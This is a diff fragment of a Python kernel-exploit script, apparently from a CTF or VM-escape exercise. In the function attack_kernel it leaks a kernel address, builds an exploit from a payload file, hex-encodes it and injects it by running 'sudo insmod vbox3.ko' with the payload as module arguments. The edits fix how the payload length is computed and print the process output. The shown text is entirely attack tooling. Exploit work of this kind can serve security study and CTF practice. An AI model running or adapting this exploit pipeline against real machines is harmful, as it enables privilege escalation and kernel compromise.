@@ -171,13 +171,12 @@ def attack_kernel(target_binary, payload_file):
     leaker.shutdown()
     print('Leaked address is', str(hex(leak)))
     exploit = create_exploit(target_binary, payload_file, leak)
+    exploit_length = len(exploit)
     exploit = bytes(exploit).hex()
-    n = 2
-    exploit = ','.join([exploit[i:i+n] for i in range(0, len(exploit), n)])
     args = ['sudo', 'insmod', 'vbox3.ko', 'exploit_payload="'+exploit+'"',
-        'exploit_length="'+str(len(exploit))+'"']
+        'exploit_length="'+str(exploit_length)+'"']
     print(args)
-    process(args)
+    print(process(args).recvall())
 
 def main():
     # Make sure we have enough args
